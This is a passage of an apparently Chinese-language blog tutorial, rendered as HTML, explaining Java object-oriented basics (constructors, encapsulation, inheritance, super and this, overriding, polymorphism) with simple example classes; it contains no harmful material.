class="string">&quot;这是一个学生&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo01;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个项目应该只有一个mian类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//类:抽象的，实例化</span></span><br><span class="line">        <span class="comment">//类实例化后会返回一个自己的对象</span></span><br><span class="line">        <span class="comment">//student对象就是一个Student类的具体实例</span></span><br><span class="line"></span><br><span class="line">        Student xiaoming= <span class="keyword">new</span> Student();</span><br><span class="line">        Student xh = <span class="keyword">new</span> Student();</span><br><span class="line">        xiaoming.age =<span class="number">18</span>;</span><br><span class="line">        xiaoming.name = <span class="string">&quot;小明&quot;</span>;</span><br><span class="line">        System.out.println(xiaoming.name);</span><br><span class="line">        System.out.println(xiaoming.age);</span><br><span class="line"></span><br><span class="line">        xh.name = <span class="string">&quot;小红&quot;</span>;</span><br><span class="line">        xh.age =<span class="number">3</span>;</span><br><span class="line">        System.out.println(xh.name);</span><br><span class="line">        System.out.println(xh.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/image-20210416211236473.png" class="lazyload" data-srcset="/2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/image-20210416211236473.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210416211236473"></p><h3 id="构造器详解"><a href="#构造器详解" class="headerlink" title="构造器详解"></a>构造器详解</h3><p>构造器也称为构造方法，是在创建对象的时候必须要调用的，有以下两个特点:</p><ul><li>必须和类的名字相同</li><li>必须没有返回类型，也不能写void</li></ul><p>作用：</p><ul><li>new本质在调用构造方法</li><li>初始化对象的属性值</li></ul><p>注意点：定义了有参构造后，如果想使用无参构造，需要显示定义一个无参的构造器</p><p><strong>快捷键：alt + insert</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo01;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一个项目应该只有一个mian类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//new 实例化了一个对象</span></span><br><span class="line">        Person person = <span class="keyword">new</span> Person(<span class="string">&quot;hahah&quot;</span>);</span><br><span class="line">        System.out.println(person.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo01;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="comment">//一个类即使什么都不写，它也会存在一个构造方法</span></span><br><span class="line">    <span class="comment">//显示的定义构造器</span></span><br><span class="line">    String name;</span><br><span class="line">    <span class="comment">//实例化初始值</span></span><br><span class="line">    <span class="comment">//1.使用new关键字，本质在调用构造器</span></span><br><span class="line">    <span class="comment">//2.用来初始化值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = <span class="string">&quot;M0th&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//有参构造，一旦定义了有参构造，无参就必须显示定义</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="创建对象简单内存分析"><a href="#创建对象简单内存分析" class="headerlink" title="创建对象简单内存分析"></a>创建对象简单内存分析</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo02;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Pet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> age;</span><br><span class="line">    <span class="comment">//无参构造</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">shout</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;叫了一声&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oop.demo02.Pet;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Pet dog = <span class="keyword">new</span> Pet();</span><br><span class="line">        dog.name = <span class="string">&quot;旺财&quot;</span>;</span><br><span class="line">        dog.age = <span class="number">3</span>;</span><br><span class="line">        dog.shout();</span><br><span class="line"></span><br><span class="line">        System.out.println(dog.name);</span><br><span class="line">        System.out.println(dog.age);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/image-20210416220452571.png" class="lazyload" data-srcset="/2021/04/11/java%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/image-20210416220452571.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210416220452571"></p><h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><p>“高内聚，低耦合”。高内聚就是类的内部数据操作细节自己完成，不允许外部干涉；低耦合：暴露少量的方法给外部使用</p><p>封装：通常，应该禁止直接访问对象中数据的实际表示，而应通过操作接口来访问，这称为信息隐藏</p><p><strong>属性私有，get/set</strong></p><p>通过公开的方法去修改私有的属性</p><p><strong>封装的意义：</strong></p><ul><li>提高程序的安全性，保护数据，帮我们处理一些不合法的属性值</li><li>隐藏代码的实现细节</li><li>统一接口</li><li>提高系统可维护性</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oop.demo02.Pet;</span><br><span class="line"><span class="keyword">import</span> oop.demo03.Student;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        s1.setName(<span class="string">&quot;M0th&quot;</span>);</span><br><span class="line">        s1.setAge(-<span class="number">1</span>); <span class="comment">//不合法的数据</span></span><br><span class="line">        System.out.println(s1.getName());</span><br><span class="line">        System.out.println(s1.getAge());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//属性私有</span></span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">char</span> sex;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//提供一些可以操作这个属性的方法</span></span><br><span class="line">    <span class="comment">//提供一些public的get、set方法</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//get 获得这个数据</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//set 给这个数据设置值</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//alt +insert</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(age&gt;<span class="number">120</span>||age&lt;<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">this</span>.age=<span class="number">3</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.age = age;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>继承的本质是对某一批类的抽象，从而实现建模</p><p><strong>extands</strong> 是扩展，子类是父类的扩展</p><p><strong>java中只有单继承没有多继承</strong></p><p>继承是类和类之间的一种关系。类和类之间的关系还有依赖，聚合，组合等</p><p>子类继承了父类，就会拥有父类的属性和方法,private除外</p><p>tips： IDEA 中 ctrl + H 可以查看继承树</p><p>在java中，所有的类，就默认直接或者间接继承Object类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  <span class="keyword">int</span> money = <span class="number">10_0000_0000</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hahahha&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getMoney</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> money;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMoney</span><span class="params">(<span class="keyword">int</span> money)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.money = money;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span>  <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"><span class="keyword">import</span> oop.demo04.Student;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        s1.say();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="super-与-this"><a href="#super-与-this" class="headerlink" title="super  与  this"></a>super  与  this</h4><ul><li>super调用父类的构造方法，必须在构造方法的第一个</li><li>super 必须只能出现在子类的方法或者构造方法中</li><li>super和this 不能同时调用构造方法</li></ul><p>比较this：</p><ul><li>代表的对象不同：<ul><li>this：本身调用者这个对象</li><li>super： 代表父类的对象的应用</li></ul></li><li>前提<ul><li>this: 没有继承也可以使用</li><li>super： 只能在继承条件下使用</li></ul></li><li>构造方法<ul><li>this();本类的构造</li><li>super();父类的构造</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span>  <span class="keyword">extends</span> <span class="title">Person</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Student</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//隐藏代码:调用了父类的无参构造</span></span><br><span class="line">        <span class="keyword">super</span>(); <span class="comment">//调用父类的构造器，必须在子类构造器的第一行</span></span><br><span class="line">        System.out.println(<span class="string">&quot;Student无参数执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>  String name = <span class="string">&quot;M0th&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;student&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        print();</span><br><span class="line">        <span class="keyword">this</span>.print();</span><br><span class="line">        <span class="keyword">super</span>.print();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span>  String name = <span class="string">&quot;kuangshen&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Person</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Person无参执行了&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oop.demo04.Student;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Student s1 = <span class="keyword">new</span> Student();</span><br><span class="line">        s1.test1();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h3><p>重写：需要有继承关系，子类重写父类的方法</p><ul><li>方法名必须相同</li><li>参数列表必须相同</li><li>修饰符：范围可以扩大，但是不能缩小  public &gt;protected&gt;default&gt;private</li><li>抛出的异常： 范围可以被做小，但是不能扩大 ClassNotFoundException –&gt; Exception（大）</li></ul><p>重写，子类的方法和父类的方法名字相同，但是方法体不同</p><p>那些方法不能够重写：</p><ol><li>static 方法，属于类，他不属于实例</li><li>final 常量</li><li>private 方法</li></ol><p>重写的意义：</p><ul><li><p>父类的功能，子类不一定需要，或者不一定满足</p><p>ALT + Insert : override；</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">extends</span> <span class="title">B</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Override 重写</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//注解:有功能的注释</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;A=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;B=&gt;test()&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oop.demo04.A;</span><br><span class="line"><span class="keyword">import</span> oop.demo04.B;</span><br><span class="line"><span class="keyword">import</span> oop.demo04.Student;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="comment">//静态的方法和非静态的方法区别很大</span></span><br><span class="line">    <span class="comment">//静态方法：方法的调用只和左边，定义的引用类型有关</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        A a =<span class="keyword">new</span> A();</span><br><span class="line">        a.test();</span><br><span class="line">        <span class="comment">//父类的引用指向了子类</span></span><br><span class="line">        B b = <span class="keyword">new</span>  A(); <span class="comment">//子类重写了父类的方法</span></span><br><span class="line">        b.test();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h3><p>同一方法可以根据发送对象的不同而采取不同的行为方式</p><p>一个对象的实际类型是确定，但是可以指向对象的引用的类型有很多</p><p>多态存在的条件</p><ul><li>有继承关系</li><li>子类重写父类方法</li><li>父类引用指向子类</li></ul><p>多态注意事项：</p><ol><li>多态是方法的多态</li><li>父类和子类，有联系 不然会报类型转换异常！ClassCastException</li><li>存在条件： 继承关系，方法需要重写，父类的引用指向子类对象！  <code>Father f1 = new Son()</code>‘</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">extends</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;son&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">eat</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;eat&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop.demo05;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> oop;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> oop.demo05.Person;</span><br><span class="line"><span class="keyword">import</span> oop.demo05.Student;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> 